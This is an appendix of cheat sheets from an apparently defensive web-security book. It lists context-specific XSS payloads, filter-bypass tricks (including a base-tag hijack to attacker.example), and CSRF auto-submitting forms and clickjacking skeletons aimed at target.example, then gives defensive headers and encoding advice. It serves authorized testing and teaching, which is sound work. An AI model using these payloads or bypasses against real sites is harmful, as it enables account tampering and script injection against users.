# Appendix A — Payload and Encoding Cheat Sheets

> Quick reference for authorized testing. Every payload here is a **benign proof of concept**
> using `alert(document.domain)` or equivalent harmless signals. Use only against systems you own
> or are authorized to test ([Chapter 1](../01-legal-and-ethics.md)). Keep payloads tagged and
> reversible; prefer the quietest signal that proves the point.

---

## A.1 The context → break-out quick table

The master skill: identify the context, emit what *ends* it, then inject.

| Context | What ends it | First move |
|---|---|---|
| HTML element content | `<` starts a tag | inject a tag directly |
| Double-quoted attribute | `"` | `">` then inject, or add new attribute |
| Single-quoted attribute | `'` | `'>` then inject, or add new attribute |
| Unquoted attribute | space / tab / newline / `/` | space + new attribute |
| Inside a tag (between attrs) | space | add `autofocus onfocus=...` |
| Inline event handler (JS string) | `'` or `"` then `)` | `');...//` |
| `<script>` block | `</script>` (tokenizer) or JS string break | `</script>` or `";...//` |
| URL (`href`/`src`) | scheme | `javascript:...` |
| `<textarea>` / `<title>` (RCDATA) | matching end tag | `</textarea>` / `</title>` |
| `<style>` (RAWTEXT) | `</style>` | `</style>` then inject |
| HTML comment | `-->` | `-->` then inject |

## A.2 Benign XSS proof-of-concept payloads by context

**Element content**
```html
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<script>alert(document.domain)</script>
```

**Double-quoted attribute** (`<input value="HERE">`)
```html
"><svg onload=alert(document.domain)>
" autofocus onfocus=alert(document.domain) x="
```

**Single-quoted attribute**
```html
'><svg onload=alert(document.domain)>
' autofocus onfocus=alert(document.domain) x='
```

**Unquoted attribute** (`<input value=HERE>`)
```html
x onfocus=alert(document.domain) autofocus
```

**Inside an event handler** (`onclick="f('HERE')"`)
```js
');alert(document.domain);//
```

**Inside `<script>`** (`var q="HERE";`)
```js
";alert(document.domain);//
</script><svg onload=alert(document.domain)>
```

**URL context** (`<a href="HERE">`)
```
javascript:alert(document.domain)
javascript&#58;alert(document.domain)   <!-- entity-decoded in attribute context -->
```

**RCDATA** (`<textarea>HERE</textarea>`, `<title>HERE</title>`)
```html
</textarea><svg onload=alert(document.domain)>
</title><svg onload=alert(document.domain)>
```

## A.3 No-`<script>` event-handler vectors

Useful when `<script>` is filtered or CSP blocks inline `<script>` but not event attributes
(a misconfiguration). All fire with little/no interaction:

```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<select autofocus onfocus=alert(document.domain)>
<textarea autofocus onfocus=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<video><source onerror=alert(document.domain)></video>
<audio src onerror=alert(document.domain)>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
```

## A.4 Filter-bypass primitives (mechanisms in Chapters 3 & 14)

```html
<!-- case -->
<ScRiPt>alert(document.domain)</ScRiPt>
<img src=x OnErRoR=alert(document.domain)>

<!-- whitespace / slash separators -->
<img/src=x/onerror=alert(document.domain)>
<svg	onload=alert(document.domain)>      <!-- tab between -->

<!-- recursive strip (single-pass tag removers) -->
<scr<script>ipt>alert(document.domain)</scr</script>ipt>

<!-- entity decoding in attribute/URL context -->
<a href="javascript&#58;alert(document.domain)">x</a>
<a href="&#x6a;avascript:alert(document.domain)">x</a>

<!-- protocol obfuscation -->
<a href="java&#9;script:alert(document.domain)">x</a>
<a href="JaVaScRiPt:alert(document.domain)">x</a>

<!-- comment breakout -->
--><svg onload=alert(document.domain)>

<!-- base hijack (repoint relative URLs) -->
<base href="//attacker.example/">

<!-- iframe srcdoc (entity-decoded document) -->
<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>
```

## A.5 HTML entity / encoding reference

| Char | Named | Decimal | Hex |
|---|---|---|---|
| `<` | `&lt;` | `&#60;` | `&#x3C;` |
| `>` | `&gt;` | `&#62;` | `&#x3E;` |
| `&` | `&amp;` | `&#38;` | `&#x26;` |
| `"` | `&quot;` | `&#34;` | `&#x22;` |
| `'` | `&#39;` (`&apos;` in XML/HTML5) | `&#39;` | `&#x27;` |
| `/` | — | `&#47;` | `&#x2F;` |
| `:` | — | `&#58;` | `&#x3A;` |
| space | — | `&#32;` | `&#x20;` |

Reminders:
- Entities decode in **text, attribute value, and RCDATA** contexts; **not** in `<script>` /
  `<style>` (Chapter 3).
- Trailing semicolons are sometimes optional in attribute contexts, aiding bypasses.
- URL-encoding (`%3C`) and HTML-encoding (`&lt;`) are **different layers**; double-decoding bugs
  combine them.

## A.6 The canary string (encoding probe)

Submit this into each input and observe what survives / how it's encoded (Chapter 6/15):

```
zqxj'"<>`/\(){}[];:=&#
```

Interpretation:
- `<` `>` literal → tag injection plausible (element-content context).
- `"` survives in a `"`-quoted attribute → attribute breakout plausible.
- `'` survives in a `'`-quoted attribute → likewise.
- backtick survives → relevant in some attribute/template contexts.
- characters silently dropped → blocklist present; consult §A.4.

## A.7 CSRF proof-of-concept skeletons

For authorized testing of an in-scope, low-impact action; verify as an account you control.

**GET-based** (if a state change is exposed over GET — itself a finding):
```html
<img src="https://target.example/account/setting?theme=dark" alt="">
```

**POST-based (auto-submitting form):**
```html
<form action="https://target.example/account/preferences" method="POST" id="f">
  <input type="hidden" name="newsletter" value="off">
</form>
<script>document.getElementById('f').submit();</script>
```

**`text/plain` JSON-ish body (test endpoints that don't enforce content type):**
```html
<form action="https://target.example/api/pref" method="POST" enctype="text/plain" id="f">
  <input name='{"newsletter":"off","x":"' value='"}'>
</form>
<script>f.submit()</script>
```

## A.8 Clickjacking PoC skeleton

For authorized testing; set `opacity` to `0.3` while aligning, then `0` for the finished illusion.
A benign PoC just needs to **show the overlap** — you don't need to trick a real user.

```html
<style>
  iframe { position:absolute; top:0; left:0; width:1000px; height:700px; opacity:0.0; z-index:2; }
  #lure  { position:absolute; z-index:1; }
</style>
<div id="lure">Free prize — click below!</div>
<button>CLAIM</button>
<iframe src="https://target.example/sensitive-action"></iframe>
```

## A.9 DOM-XSS source/sink quick lists

**Sources:** `location.href|search|hash|pathname`, `document.URL|documentURI|baseURI`,
`document.referrer`, `window.name`, `postMessage` `event.data`, `localStorage`/`sessionStorage`,
`document.cookie`.

**Sinks:** `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write/writeln`, `eval`,
`Function(...)`, `setTimeout/​setInterval('...')`, `location`/`.href`/`assign`/`replace`,
`element.src`/`.href`, `iframe.srcdoc`, `script.src`, jQuery `$()`/`.html()`/`.append()`,
React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`.

**Safe sinks:** `textContent`, `innerText`, `setAttribute` for non-URL attrs, `JSON.parse`.

## A.10 Defensive headers quick reference (Chapters 18–19)

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self';
  require-trusted-types-for 'script'; trusted-types default
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

## A.11 Encoding-by-context cheat (defenders)

| Sink context | Use this encoding |
|---|---|
| HTML element content | HTML-entity encode |
| Quoted attribute | HTML-entity encode (quote it!) |
| URL attribute | scheme allow-list + canonicalize, then attribute-encode |
| JavaScript string | JS string escaping (`\xHH`/unicode) |
| CSS value | CSS escaping (better: avoid untrusted data in CSS) |
| Rich text (must allow HTML) | vetted allow-list sanitizer (e.g., DOMPurify) + CSP/Trusted Types |

---

[← Previous: Chapter 19 — Content Security Policy in Depth](../part6/19-csp.md) | [Next: Appendix B — Glossary →](B-glossary.md)
